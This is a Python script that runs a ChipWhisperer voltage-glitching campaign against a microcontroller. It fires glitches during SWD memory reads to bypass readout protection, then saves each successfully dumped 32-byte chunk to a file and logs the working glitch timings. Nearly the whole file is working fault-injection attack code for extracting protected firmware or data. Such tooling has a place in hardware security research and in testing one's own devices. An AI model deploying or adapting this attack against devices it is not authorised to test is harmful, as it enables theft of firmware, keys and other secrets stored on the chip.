#!/usr/bin/env python3
"""
Flash Memory Dump via Glitching - Full Range Scan
Continues through entire ext_offset range without stopping
Saves files as [address]_[offset].bin
"""

import chipwhisperer.common.results.glitch as glitch
import chipwhisperer as cw
from swd import Swd
import time
import os
from datetime import datetime
import signal
import sys

# Configuration
ENABLE_GLITCH = True  # Set to True to enable glitching, False to just test SWD reads
ENABLE_RESET = True   # Set to False to disable resets (useful for SRAM testing)

# Target memory range
FLASH_START = 0x1FFF7860  # Start of flash storage area
FLASH_END = 0x1FFF787F    # End of flash storage area
#FLASH_START = 0x20000000  # Start of flash storage area
#FLASH_END = 0x2000001F    # End of flash storage area
CHUNK_SIZE = 32           # Read 32 bytes at a time

def check_memory_read(address):
    """Try to read memory - success means RDP was bypassed"""
    try:
        swd = Swd(swd_frequency=100000)  # 100 kHz SWD speed
        data = bytes(swd.read_mem(address, CHUNK_SIZE))
        if len(data) == CHUNK_SIZE:
            print(f"\n💥 SUCCESS! Read {len(data)} bytes from 0x{address:08X}")
            print(f"First 16 bytes: ", end="")
            for i in range(min(16, len(data))):
                print(f"{data[i]:02X} ", end="")
            print()
            return data
    except Exception as e:
        print(f".", end="")
    return None

def save_memory_chunk(address, data, ext_offset):
    """Save memory chunk to file with address and offset in filename"""
    if not os.path.exists('FLASH'):
        os.makedirs('FLASH')

    # Save individual chunk with address and offset
    filename = f"FLASH/0x{address:08X}_{ext_offset}.bin"
    with open(filename, 'wb') as f:
        f.write(data)
    print(f"Saved to {filename}")
    # No combined file - each successful glitch gets its own file

def log_successful_glitch(address, ext_offset, width, offset, attempts, iteration):
    """Log successful glitch to master log file"""
    MASTER_LOG = 'FLASH/glitch_master_log.csv'

    # Create log file with header if it doesn't exist
    if not os.path.exists(MASTER_LOG):
        with open(MASTER_LOG, 'w') as f:
            f.write("Timestamp,Address,ExtOffset,Width,Offset,TimeToFind_sec,Attempts,Iteration,Timing_us\n")

    # Append successful glitch parameters
    with open(MASTER_LOG, 'a') as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        timing_us = ext_offset / 100  # Convert to microseconds
        f.write(f"{timestamp},0x{address:08X},{ext_offset},{width},{offset},0.0,{attempts},{iteration},{timing_us:.1f}\n")
        f.flush()

def cleanup_and_exit(signum=None, frame=None):
    """Gracefully cleanup before exit"""
    print("\n\n⚠️ Interrupt received - cleaning up...")

    try:
        # Ensure TIO2 is low
        scope.io.tio2 = False
        print("✓ TIO2 set low")

        # Ensure nRST is released (high-z)
        scope.io.nrst = 'high_z'
        print("✓ nRST released")

        # Ensure TIO3 is high-z
        scope.io.tio3 = 'high_z'
        print("✓ TIO3 set to high-z")

        # Disconnect scope
        scope.dis()
        print("✓ Scope disconnected")

    except Exception as e:
        print(f"⚠️ Cleanup error: {e}")

    print("✅ Clean exit - SWD should remain intact")
    sys.exit(0)

# Register signal handlers for graceful exit
signal.signal(signal.SIGINT, cleanup_and_exit)  # Ctrl+C
signal.signal(signal.SIGTERM, cleanup_and_exit)  # Kill signal

# Connect to ChipWhisperer
print("="*60)
print("Flash Dump Glitch Campaign - Full Range Scan")
print("="*60)

try:
    scope = cw.scope()
except Exception as e:
    print(f"❌ Failed to connect to ChipWhisperer: {e}")
    sys.exit(1)

# Set up scope parameters
scope.clock.clkgen_freq = 100E6
scope.trigger.triggers = 'tio3'  # Trigger on TIO3 (SWDIO)
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "enable_only"
scope.glitch.trigger_src = "ext_single"
scope.io.glitch_lp = True
scope.io.glitch_hp = True
scope.glitch.repeat = 5

# Configure TIO3 as input to monitor SWDIO
scope.io.tio3 = 'high_z'
# TIO2 will mark the read operation timing

# Glitch controller setup
g_step = 10  # Steps of 0.1 microseconds
gc = glitch.GlitchController(groups=["success", "failure"], parameters=["width", "offset", "ext_offset"])
gc.set_global_step(g_step)

# Glitch parameters from glitch_memory_read_nrst.py
width_min, width_max = 40, 40
offset_min, offset_max = -45, -45
#ext_offset_min, ext_offset_max = 63000, 97000  # 630µs start
#ext_offset_min, ext_offset_max = 129300, 190000  # 1.6µs range (160 * 0.01µs = 1.6µs)
#ext_offset_min, ext_offset_max = 120000, 132000  # 1.6µs range (160 * 0.01µs = 1.6µs)
ext_offset_min, ext_offset_max = 0, 1650000  # 14ms to 15ms range (10000 * 0.01µs = 0.1ms)

gc.set_range("width", width_min, width_max)
gc.set_range("offset", offset_min, offset_max)
gc.set_range("ext_offset", ext_offset_min, ext_offset_max)

print(f"\nGlitch Configuration:")
print(f"  Width: {width_min} to {width_max}")
print(f"  Offset: {offset_min}")
print(f"  Ext_offset: {ext_offset_min/100:.1f}µs to {ext_offset_max/100:.1f}µs")
print(f"  Step: {g_step/100:.1f}µs")
print(f"  Trigger: TIO3 (SWDIO)")
print(f"  SWD Speed: 100 kHz (slow, longer transaction windows)")
print(f"  Mode: FULL SCAN - Will test all offsets")

sample_size = 50  # Attempts per setting

print(f"\nTarget range: 0x{FLASH_START:08X} - 0x{FLASH_END:08X}")
print(f"Chunk size: {CHUNK_SIZE} bytes")
print(f"Sample size: {sample_size} attempts per setting")
print("="*60)

input("\nPress Enter to start FULL SCAN (Ctrl+C to exit)...")

# Announce start of campaign
os.system(f"espeak 'Starting glitch campaign.' 2>/dev/null")
print("🔊 Announced start of campaign")

current_address = FLASH_START
total_attempts = 0
total_successes = 0

# Main glitch campaign loop
while current_address <= FLASH_END:
    print(f"\n🎯 Target: 0x{current_address:08X}")

    address_successes = 0

    for glitch_setting in gc.glitch_values():
        scope.glitch.width = glitch_setting[0]
        scope.glitch.offset = glitch_setting[1]
        scope.glitch.ext_offset = glitch_setting[2]

        print(f"Testing ext_offset: {scope.glitch.ext_offset/100:.1f}µs ", end="")

        for i in range(sample_size):
            print(f".", end="", flush=True)

            # Arm scope - will trigger on SWDIO activity
            if ENABLE_GLITCH:
                scope.arm()

            total_attempts += 1

            # Set TIO2 high to mark start of read operation
            scope.io.tio2 = True

            # Attempt memory read - SWDIO activity will trigger glitch
            data = check_memory_read(current_address)

            # Set TIO2 low to mark end of read operation
            scope.io.tio2 = False

            if data:
                print(f"\n✅ GLITCH SUCCESS at ext_offset={scope.glitch.ext_offset/100:.1f}µs")
                # Use text-to-speech to announce success
                os.system(f"espeak 'Glitch success at {scope.glitch.ext_offset/100:.1f} microseconds' 2>/dev/null")
                # Save with address and offset in filename
                save_memory_chunk(current_address, data, scope.glitch.ext_offset)
                # Log the successful glitch parameters
                log_successful_glitch(current_address, scope.glitch.ext_offset,
                                    scope.glitch.width, scope.glitch.offset,
                                    total_attempts, i+1)
                print(f"📝 Logged to FLASH/glitch_master_log.csv")
                address_successes += 1
                total_successes += 1
                # DON'T BREAK - Continue testing other offsets
                print(f"   Continuing scan... ({address_successes} successes so far)")

            time.sleep(0.5)

        # Reset after all sample attempts for this glitch setting (only if enabled)
        if ENABLE_RESET and ENABLE_GLITCH:
            scope.io.nrst = False
            time.sleep(0.1)
            scope.io.nrst = 'high_z'
            time.sleep(0.5)

        # Report status for this offset
        if address_successes > 0:
            print(f" Found {address_successes} working offsets so far")
        else:
            print(" Failed")

    # Report summary for this address
    if address_successes > 0:
        print(f"\n✨ Address 0x{current_address:08X} complete: {address_successes} successful glitches found")
    else:
        print(f"\n⚠️ Address 0x{current_address:08X}: No successful glitches found")

    # Move to next address
    current_address += CHUNK_SIZE

print("\n" + "="*60)
print("Full scan complete!")
print(f"Total attempts: {total_attempts}")
print(f"Total successes: {total_successes}")
print(f"Success rate: {(total_successes/total_attempts)*100:.2f}%")
print("="*60)

# Clean exit at end of script
cleanup_and_exit()